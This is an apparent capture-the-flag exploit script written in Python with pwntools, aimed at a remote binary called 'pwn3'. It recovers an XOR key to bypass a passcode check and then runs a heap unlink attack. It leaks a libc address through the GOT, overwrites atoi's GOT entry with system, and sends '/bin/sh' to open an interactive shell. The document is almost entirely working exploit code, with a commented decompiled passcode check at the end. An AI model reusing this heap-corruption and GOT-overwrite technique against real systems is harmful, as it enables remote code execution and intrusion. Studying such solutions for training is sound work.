# coding:utf-8
from pwn import *
debug = 0
context.log_level='debug'
elf = ELF('./pwn3')
#libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
if debug:
    p = process('./pwn3')#,env={'LD_PRELOAD':'/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so'})
    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x64')
#    gdb.attach(p)
else:
    p = remote('123.59.138.180', 13579)#  123.59.138.180 13579123.59.138.180 13579
    libc = ELF('./libc.so.6.64')

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def add(size):
	sleep(0.2)
	p.sendline('1')
	sleep(0.2)
	p.sendline(str(size))

def fill(index,len,data):
	sleep(0.2)
	p.sendline('3')
	sleep(0.2)
	p.sendline(str(index))
	sleep(0.2)
	p.sendline(str(len))
	sleep(0.2)
	p.send(data)

def show(index):
	sleep(0.2)
	p.sendline('4')
	sleep(0.2)
	p.sendline(str(index))

def delete(index):
	sleep(0.2)
	p.sendline('2')
	sleep(0.2)
	p.sendline(str(index))


data1=p.recv(4)
data2=p.recv()

pad1="No passcode No fun\n"
xor=[]
for i in range(len(pad1)):
	xor.append(ord(pad1[i])^ord(data2[i]))
print xor

sleep(0.5)
p.sendline('8')
sleep(0.5)

passcode='1Chun0iu'
enc=''
for i in range(len(passcode)):
	enc+=chr(ord(passcode[i])^xor[i])

p.send(enc)

add(0x200)#0
add(0x108)#1
add(0x108)#2
add(0x108)#3

data = '\x00'*(0x200 - 1)
fill(0,0x200 - 1,data)

show(0)
p.recvuntil('Note 0\n')

key = p.recv(0x180)
print 'key:'+key


payload = ''
payload += '\x00'*(0x100 - 0x10)
payload += p64(0x100) + p64(0x111)

pay = ''
for i in range(0,14*8):
	pay+=chr(ord(payload[i])^ord(key[i]))
for i in range(14*8,2*14*8):
	pay+=chr(ord(payload[i])^ord(key[i]))
for i in range(2*14*8,len(payload)):
	pay+=chr(ord(payload[i])^ord(key[i]))

fill(2,0x100,pay)



payload = ''
payload += p64(0) + p64(0x101)
payload += p64(0x602120 + 0x10 - 0x18) + p64(0x602120 + 0x10 - 0x10)
payload += '\x00'*(0x100 - 32)
payload += p64(0x100)

pay = ''
for i in range(0,14*8):
	pay+=chr(ord(payload[i])^ord(key[i]))
for i in range(14*8,2*14*8):
	pay+=chr(ord(payload[i])^ord(key[i]))
for i in range(2*14*8,len(payload)):
	pay+=chr(ord(payload[i])^ord(key[i]))

fill(1,0x108,pay)

#z()
delete(2)

payload = ''
payload += p64(0) + p64(elf.got['puts'])

pay = ''
for i in range(0,len(payload)):
	pay+=chr(ord(payload[i])^ord(key[i]))
#p.interactive()
#fill(1,0x10,pay)
#z()
sleep(0.2)
p.sendline('3')
sleep(0.2)
p.sendline(str(1))
sleep(0.2)
p.sendline(str(0x10+1))
sleep(0.2)
p.send(pay)

#z()
#show(0)
#p.interactive()
sleep(0.2)
p.sendline('4')
sleep(0.2)
p.sendline(str(0))
sleep(0.2)
p.recvuntil('Note 0\n')

puts_addr = u64(p.recv(6).ljust(8,'\x00'))
print 'puts_addr:'+hex(puts_addr)
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
print 'system_addr:'+hex(system_addr)

payload = ''
payload += p64(0) + p64(elf.got['atoi']) + p64(0x10)

pay = ''
for i in range(0,len(payload)):
	pay+=chr(ord(payload[i])^ord(key[i]))
#p.interactive()
#fill(1,0x10,pay)

sleep(0.2)
p.sendline('3')
sleep(0.2)
p.sendline(str(1))
sleep(0.2)
p.sendline(str(0x18+1))
sleep(0.2)
p.send(pay)


#z()
payload = ''
payload += p64(system_addr)

pay = ''
for i in range(0,len(payload)):
	pay+=chr(ord(payload[i])^ord(key[i]))
#p.interactive()
#fill(1,0x10,pay)

sleep(0.2)
p.sendline('3')
sleep(0.2)
p.sendline(str(0))
sleep(0.2)
p.sendline(str(8+1))
sleep(0.2)
p.send(pay)
#z()
sleep(0.2)

p.sendline('/bin/sh\x00')

p.interactive()

# 
# 0x602120:	0x12fc060	0x200
# 0x602130:	0x602118	0x108




 # if ( 0x14B * v1[6] + 317 * v1[5] + 313 * v1[4] + 311 * v1[3] + 307 * v1[2] + 293 * v1[1] + 283 * v1[0] + 337 * v1[7] != 0x3716B
 #    || 509 * v1[6] + 503 * v1[5] + 499 * v1[4] + 491 * v1[3] + 487 * v1[2] + 479 * v1[1] + 467 * v1[0] + 521 * v1[7] != 0x5709B
 #    || 587 * v1[6] + 577 * v1[5] + 571 * v1[4] + 569 * v1[3] + 563 * v1[2] + 557 * v1[1] + 547 * v1[0] + 593 * v1[7] != 0x64491
 #    || 643 * v1[6] + 641 * v1[5] + 631 * v1[4] + 619 * v1[3] + 617 * v1[2] + 613 * v1[1] + 607 * v1[0] + 647 * v1[7] != 0x6E0ED
 #    || 773 * v1[6] + 769 * v1[5] + 761 * v1[4] + 757 * v1[3] + 751 * v1[2] + 743 * v1[1] + 739 * v1[0] + 787 * v1[7] != 0x856E3
 #    || 853 * v1[6] + 839 * v1[5] + 829 * v1[4] + 827 * v1[3] + 823 * v1[2] + 821 * v1[1] + 811 * v1[0] + 857 * v1[7] != 0x92179
 #    || 919 * v1[6] + 911 * v1[5] + 907 * v1[4] + 887 * v1[3] + 883 * v1[2] + 881 * v1[1] + 877 * v1[0] + 929 * v1[7] != 0x9DC99
 #    || 1319 * v1[6]
 #     + 1307 * v1[5]
 #     + 1303 * v1[4]
 #     + 1301 * v1[3]
 #     + 1297 * v1[2]
 #     + 1291 * v1[1]
 #     + 1289 * v1[0]
 #     + 1321 * v1[7] != 0xE47C9 )